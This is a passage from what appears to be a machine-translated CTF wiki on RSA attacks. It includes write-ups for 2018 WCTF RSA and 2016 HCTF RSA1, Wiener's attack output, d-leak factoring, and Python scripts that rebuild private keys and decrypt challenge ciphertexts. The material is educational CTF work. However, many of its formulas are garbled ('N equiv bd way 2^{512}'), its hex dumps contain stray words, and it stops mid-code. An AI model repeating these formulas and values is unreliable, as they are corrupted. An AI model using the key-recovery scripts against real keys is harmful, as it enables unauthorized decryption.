54:35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18:\n\n12: 67: a9: de: 37: 7d: 44: 65: 5e: 68: 0: 78: 39: 3d: bb:\n00: 22: 35: 0e: a3: 94: e6: 94: 15: 1a: 3d: 39: c7: 50: 0e:\nb1: 64: a5: 29: 40: 69: 94: b0: 0d: 1a: ea: 9a:\nAnd it&amp;#39;s not like that.\n3e: 7d\nExponent: 65537 (0x10001)\n\nModulus=C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D\n\nwriting RSA key\n\n-----BEGIN PUBLIC KEY-----\n\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVan\nKp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg\n\n/duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ\n\nOaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA\n\nVgYNWPxBZF4G2oPQOwZCcNo4U + BUNVPO3nlKv / U75VN / bBgSZ6neN31EZV5oCng5\nPbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+\n\nFQIDAQAB\n-----END PUBLIC KEY-----\n</code></pre> <p>It seems that it is still not very big, break down again, and then try the factordb not, try yafu. The result is broken down.</p> <pre><code>P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383\n\n\n\nP309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259\n</code></pre> <p>It can be found that these two numbers are very similar, and it may be that factordb does not implement this type of decomposition.</p> <p>Then the following operation is similar to level0. Just this time it is just a direct decryption, no filling, try to fill but wrong</p> <p>Get the password <code>fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS</code>. Continue to the next step to view the public key</p> <pre><code>\u279c  level2 git:(master) \u2717 openssl rsa -pubin -in public.key -text -modulus\n\nPublic-Key: (1025 bit)\n\nModulus:\n\n01: ba: 0c: c2: 45: b4: 5c: e5: b5: f5: 6c: d5: ca: a5: 90:\n    c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85:\n\n    8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33:\n\nf7: 2c: 2c: 0d: 21: c2: 4a: d4: c5: f5: 09: 94: c2: 39: 9d:\n73: e5: 04: a2: 66: 1d: 9c: 4b: 99: d5: 38: 44:\ncd: 12: a4: d0: 16: 79: f0: ac: 75: f9: a4: ea: a8: 7c: 32:\n16: 9: 17: d7: 7d: 80: f: 60: 29: 64: c7: ea: 50: 30: 63:\n    76:59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d:\n\nd5: 24: 7d: 4f: a7: a1: f0: d5: 73\nExponent:\n\n    01:00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7:\n\n    50:5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd:\n\n    92:70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf:\n\n2d: b3: 0a: 6d: 02: 7c: 56: 61: 7c: 7e: db:\n28: 66: 9e: fb: 3d: 2f: 2c: 20: 59: 3c: 21: ef: ff: 31: 00:\n6a: 68: 4a: 0a: 4c: 1a: a7: 09: d5: 48: 98: c8:\n    1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc:\n\nba: 31: 4f: 5e: 07: 83: to: 0e: 7f: b9: 82: a4: d2: 01: ago:\n68: 29: 6d: 66: 7c: cf: 57: b9: 4b\nModulus=1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573\n\nwriting RSA key\n\n-----BEGIN PUBLIC KEY-----\n\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN\nEj2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm\n\nHZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq\n\nW7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC\n\n3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5 + C37ZIihmnvs9LywgWTwh7 / 8xAGr7\np2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8\n\nz1e5Sw==\n\n-----END PUBLIC KEY-----\n</code></pre> <p>It is found that the private keys e and n are almost the same size. Considering that d is relatively small, use Wiener's Attack. Get d, of course, you can verify it again.</p> <pre><code>\u279c  level2 git:(master) \u2717 python RSAwienerHacker.py\n\nTesting Wiener Attack\n\nHacked!\n\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n\n-------------------------\n</code></pre> <p>At this time we decrypt the ciphertext and decrypt the code as follows</p> <pre><code>from Crypto.PublicKey import RSA\n\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\n\nimport gmpy2\n\nfrom base64 import b64decode\n\nd = 29897859398360008828023114464512538800655735360280670512160838259524245332403L\n\nwith open('./public.key') as f:\n\n    key = RSA.importKey(f)\n\n    n = key.n\n\ne = key.e\n\n\n\n\ndef getprivatekey(n, e, d):\n\n    priviatekey = RSA.construct((long(n), long(e), long(d)))\n\n    with open('private.pem', 'w') as f:\n\n        f.write(priviatekey.exportKey())\n\n\n\n\n\ndef decrypt():\n\n    with open('./level3.passwd.enc') as f:\n\n        cipher = f.read()\n\n    with open('./private.pem') as f:\n\n        key = RSA.importKey(f)\n\n    print key.decrypt(cipher)\n\n\n\n\ngetprivatekey(n, e, d)\n\ndecrypt()\n</code></pre> <p>Use the string <code>wIe6ER1s_1TtA3k_e_t00_larg3</code> at the end to decrypt the compressed package, taking care to remove B. At this point, all decryption ends and a flag is obtained.</p>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-wctf-rsa","title":"2018 WCTF RSA","text":"<p>The basic description of the topic is</p> <pre><code>Description:\n\nEncrypted message for user \"admin\":\n\n\n\n&lt;&lt;&lt;320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901&gt;&gt;&gt;\n\n\n\nadmin public key:\n\n\n\nn = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927\n\ne = 65537\n\n\nService: http://36.110.234.253\n</code></pre> <p>There is no way to get the binary online now. The binary obtained is now downloaded. We need to log in to the user's admin to download the corresponding generator.</p> <p>By simply reversing this generator, we can see that this program works like this.</p> <ul> <li>Iteratively decrypts the data after a certain fixed location** with a user-specified license (32 bytes), each set of 32 bytes, different from the key or the result.</li> <li> <p>The key is generated by</p> <ul> <li> <p>k_1=key</p> </li> <li> <p>k_2 =sha256(k_1)</p> </li> <li> <p>...</p> </li> <li> <p>k_n=sha256(k_{n-1})</p> </li> </ul> </li> </ul> <p>Among them, the fixed position is the position where the <code>ENCRYPTED</code> appears for the second time in the source file <code>generator</code>, and then offset by 32 bytes.</p> <pre><code>    _ENCRYPT_STR = ENCRYPTED_STR;\n\n    v10 = 0;\n\n    ENCRYPTED_LEN = strlen(ENCRYPTED_STR);\n\n    do\n\n    {\n\n      do\n\n++ v9;\n      while ( strncmp(&amp;file_contents[v9], _ENCRYPT_STR, ENCRYPTED_LEN) );\n\n      ++v10;\n\n    }\n\n    while ( v10 &lt;= 1 );\n\n    v11 = &amp;file_start_off_32[loc2 + ENCRYPTED_LEN];\n\nv12 = loc2 + ENCRYPTED_LEN;\nlen = file_size - (loc2 + ENCRYPTED_LEN) - 32;\n    decrypt(&amp;file_start_off_32[v12], &amp;license, len);\n\n    sha256_file_start(v11, len, &amp;output);\n\n    if ( !memcmp(&amp;output, &amp;file_contents[v12], 0x20u) )\n\n    {\n\n      v14 = fopen(\"out.exe\", \"wb\");\n\nfwrite (v11, 1u, len, v14);\n      fclose(v14);\n\n      sprintf(byte_406020, \"out.exe %s\", argv[1]);\n\n      system(byte_406020);\n\n    }\n</code></pre> <p>At the same time, we need to ensure that the hash of the generated file is exactly the specified value. Since the file is an exe file at the end, we can think that the last file header is the standard exe file, so we don't need to know the original. The license file, and then we can write a python script to generate the exe.</p> <p>In the generated exe, we analyze the basic flow of the program as</p> <p>Read the license 2. Use the license as the seed to generate pq separately. 3. Use p,q to generate n,e,d.</p> <p>The vulnerability appears on the method of generating p, q, and the method of generating p and q is similar.</p> <p>If we carefully analyze the function of generating prime numbers, we can see that each prime number is generated in two parts.</p> <ol> <li>Generate 512 bits in the left half.</li> <li>Generate the right half of the 512 bits.</li> <li>The left and right 1024 bits are determined to determine whether it is a prime number. If the prime number is successful, it is not a prime number and continues to be generated.</li> </ol> <p>The way to generate each part is the same, in the way</p> <pre><code>sha512 (const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9)\nv9 = r% 1000000007\n</code></pre> <p>Only v9 will change, but its scope is fixed.</p> <p>So if we say p,q is</p> <p>p=a*2^{512}+b</p> <p>q=c*2^{512}+d</p> <p>Then</p> <p>$ n = pq = a * 2 ^ {1024} + (ad + bc) * 2 ^ {512} + bd $</p> <p>Then</p> <p>$ N  equiv bd  way 2 ^ {512} $</p> <p>And since p and q are generated, a, b, c, and d have only 1000000007 possibilities.</p> <p>Furthermore, we can enumerate all the possibilities, first calculate the possible set of b as S, and we use the intermediate encounter attack to calculate</p> <p>n/d \\equiv b \\bmod 2^{512}</p> <p>Since b and d are both the mantissa of p, they must not be a multiple of 2, and there must be an inverse.</p> <p>Although this can be done, however, we can simply calculate the storage space.</p> <p>64*1000000007 / 1024 / 1024 / 1024=59</p> <p>That means 59 G is needed, too big, so we still need to think further</p> <p>$ N  equiv bd  way 2 ^ {64} $</p> <p>In this way, our memory demand dropped to around 8 G in an instant. We still use the enumeration method to perform the operation.</p> <p>Second, we can't use python, python takes up too much space, so it needs to be written in c/c++.</p> <p>Enumerate all possible d to calculate the corresponding value n/d If the corresponding value is in set S, then we can think of finding a pair of legal b and d, so we can recover half of p and q.</p> <p>After that, we</p> <p>$ B = n ^ {1024} and * 2 + (a + b) * 2 ^ {$ 512}</p> <p>Can get</p> <p>$  Frac {n} {2-b ^} = {512} and {512} * 2 ^ + b + for $</p> <p>$  Frac {n} {2-bd} ^ {512}  equiv ad + bc  way 2 ^ {512} $</p> <p>Similarly, we can calculate a and c so that we can fully recover p and q.</p> <p>In the process of solving the concrete, when we find part of p and q, we can find that because it is modulo 2^{64}, there may be a collision (but in fact, one is p, the other is q, just symmetry.). Below we find the v9 corresponding to b.</p> <p>**Note: The space enumerated here takes up approximately 11 Gs (including the index), so choose the appropriate location. **</p> <pre><code>b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137\n\nsearch 23000000\n\nsearch 32000000\n\nsearch 2b000000\n\nsearch d000000\n\nsearch 3a000000\n\nsearch 1c000000\n\nsearch 6000000\n\nsearch 24000000\n\nsearch 15000000\n\nsearch 33000000\n\nsearch 2c000000\n\nsearch e000000\n\nb64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175\n\nsearch 1d000000\n\nsearch 3b000000\n\nsearch 7000000\n\nsearch 16000000\n\nsearch 25000000\n\nsearch 34000000\n</code></pre> <p>In fact, after we actually get a part of p or q, the other part can be obtained by violent enumeration, because the calculation is almost the same, and the final result is</p> <pre><code>...\n\nhash 7000000\n\nhash 30000000\n\np = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869\n\nq = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283\n\nplain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885\n\nhash 16000000\n\nhash 25000000\n\nhash b000000\n\nhash 34000000\n\nhash 1a000000\n\n...\n\n\u279c 2018-WCTF-rsa go to: (master) \u2717 python\nPython 2.7.14 (default, Mar 22 2018, 14:43:05)\n\n[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)] on darwin\n\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n&gt;&gt;&gt; p=13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885\n\n&gt;&gt;&gt; hex(p)[2:].decode('hex')\n\nTraceback (most recent call last):\n\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n\n  File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\", line 42, in hex_decode\n\n    output = binascii.a2b_hex(input)\n\nTypeError: Odd-length string\n\n&gt;&gt;&gt; hex(p)[2:-1].decode('hex')\n\n'flag{fa6778724ed740396fc001b198f30313}'\n</code></pre> <p>Finally we got the flag.</p> <p>**Please refer to the ctf-challenge repository for detailed utilization code. **</p> <p>Related compilation instructions need to link related libraries.</p> <pre><code>g++  exp2.cpp -std=c++11 -o main2 -lgmp -lcrypto -pthread\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#reference","title":"Reference","text":"<ul> <li>https://upbhack.de/posts/wctf-2018-writeup-rsa/</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/","title":"Private Key d Related Attacks","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#d-leak-attack","title":"d Leak attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#attack-principle","title":"Attack principle","text":"<p>First, when d is leaked, we can naturally decrypt all encrypted messages. We can even decompose the modulus N. The basic principle is as follows</p> <p>We know ed \\equiv 1 \\bmod \\varphi(n), then \\varphi(n) | k=ed-1. Obviously k is an even number, we can make k=2^tr, where r is odd and t is not less than 1. So for any number g that is relative to N, we have g^k \\equiv 1 \\bmod n. Then z=g^{\\frac{k}{2}} is the quadratic root of the modulo N. Then we have</p> <p>$$</p> <p>z^2 \\equiv 1 \\bmod p \\</p> <p>z^2 \\equiv 1 \\bmod q</p> <p>$$</p> <p>Furthermore, we know that the equation has the following four solutions, the first two are</p> <p>$$</p> <p>x  equiv  PM1  N way $$</p> <p>The last two are \\pm x, where x satisfies the following conditions</p> <p>$$</p> <p>x  equiv 1  p \\ way x  equiv -1  q way $$</p> <p>Obviously, z=g^{\\frac{k}{2}} satisfies the latter condition, and we can calculate gcd(z-1,N) to decompose N.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#tools","title":"Tools","text":"<p>Use the following tools to perform calculations directly</p> <ul> <li> <p>RsaConverter.exe (https://sourceforge.net/projects/rsaconverter/ , for windows )</p> </li> <li> <p>rsatool.py</p> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2017-hitb-hack-in-the-card-ii","title":"2017 HITB - hack in the card II","text":"<p>The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -&gt; publickey.pem). However it seems that they missed something......  </p> <p>Can you decrypt the following hex-encoded ciphertext this time?  </p> <p>```</p> <p>&gt; 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977</p> <p>```</p> <p>This question is a question that follows 2017 HITB - hack in the card I. We use <code>openssl</code> to view the public key of <code>publickey.pem</code> and find that its N is the same as the N of the previous question, and the N of the previous question, e,d is known. Thus, you can directly use the above <code>rsatool.py</code> to get p, q, and calculate e from the e of this problem to get the plain text.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#wieners-attack","title":"Wiener's Attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#attack-conditions","title":"Attack conditions","text":"<p>When d is small (d&lt;\\frac{1}{3}N^{\\frac{1}{4}}), an attacker can use Wiener's Attack to get the private key.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#attack-principle_1","title":"Attack principle","text":"<ul> <li> <p>https://en.wikipedia.org/wiki/Wiener%27s_attack</p> </li> <li> <p>https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/</p> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#tools_1","title":"Tools","text":"<ul> <li>https://github.com/pablocelayes/rsa-wiener-attack</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#comprehensive-example","title":"Comprehensive example","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2016-hctf-rsa1","title":"2016 HCTF RSA1","text":"<p>Here we take the RSA 1 - Crypto So Interesting in the 2016 HCTF as an example, [source code link] (https://github.com/Hcamael/ctf-library/tree/master/RSA1).</p> <p>First, bypass the proof part of the program, and you can bypass it with almost random data.</p> <p>Second, let's analyze the specific code part. The program gets the flag according to our token. Here we directly use the token provided in the source code.</p> <pre><code>    print \"This is a RSA Decryption System\"\n\n    print \"Please enter Your team token: \"\n\n    token = raw_input()\n\n    try:\n\n        flag = get_flag(token)\n\n        assert len(flag) == 38\n\n    except:\n\n        print \"Token error!\"\n\n        m_exit(-1)\n</code></pre> <p>Next we first know n=pq, let's take a closer look at how this e, d is obtained.</p> <pre><code>    p=getPrime(2048)\n\n    q=getPrime(2048)\n\n    n = p * q\n\n    e, d = get_ed(p, q)\n\n    print \"n: \", hex(n)\n\nprint &amp;quot;e:&amp;quot;, hex (e)\n</code></pre> <p><code>get_ed</code> function is as follows</p> <pre><code>def get_ed(p, q):\n\n    k = cal_bit(q*p)\n\nphi_n = (p-1) * (q-1)\nr = random.randint (10, 99)\n    while True:\n\n        u = getPrime(k/4 - r)\n\n        if gcd(u, phi_n) != 1:\n\n            continue\n\nt = invmod (u, phi_n)\ne = pi_b (t)\nif gcd (e, phi_n) == 1:\n            break\n\nd = invmod (e, phi_n)\n    return (e, d)\n</code></pre> <p>It can be seen that the number of bits we get is less than a quarter of the number of bits in n, which is almost the same as Wiener's Attack. And we calculated u, t, e, d also meet the following conditions</p> <p>$$</p> <p>\\begin{align*}</p> <p>out &amp; equals 1 bmod varphi (n) Others &amp;  equiv 1  bt \\ way ed &amp;\\equiv 1 \\bmod \\varphi(n)</p> <p>\\end{align*}</p> <p>$$</p> <p>According to the conditions given in the title, we already know n, e, bt.</p> <p>So first we can know e according to the second formula above. At this time, you can use the first formula for Wiener's Attack to get u. Then we can use the private key index to leak the attack to decompose N to get p, q. Then we can get d.</p> <p>First we bypassed proof and got N, e. The encrypted flag is as follows</p> <pre><code>n:  0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\n\nis:\nflag:  0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n</code></pre> <p>Secondly, use the following method to get Wiener's Attack to get u, as follows</p> <pre><code>if __name__ == \"__main__\":\n\nbt =\ne =\n    t = gmpy2.invert(e, bt)\n\n    n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\n\n    solve(n, t)\n</code></pre> <p>The solve function is the function of the corresponding Wiener's Attack.</p> <p>We got u as follows</p> <pre><code>\u279c rsa-wiener-attack git: (master) \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\n\nHacked!\n\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n\n-------------------------\n\nHacked!\n\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n</code></pre> <p>Then use RsaConverter and u,t,n to get the corresponding p and q. as follows</p> <pre><code>94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n</code></pre> <p>Then we go directly to get d, and then we can recover the plaintext.</p> <pre><code>    p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n\n    q = 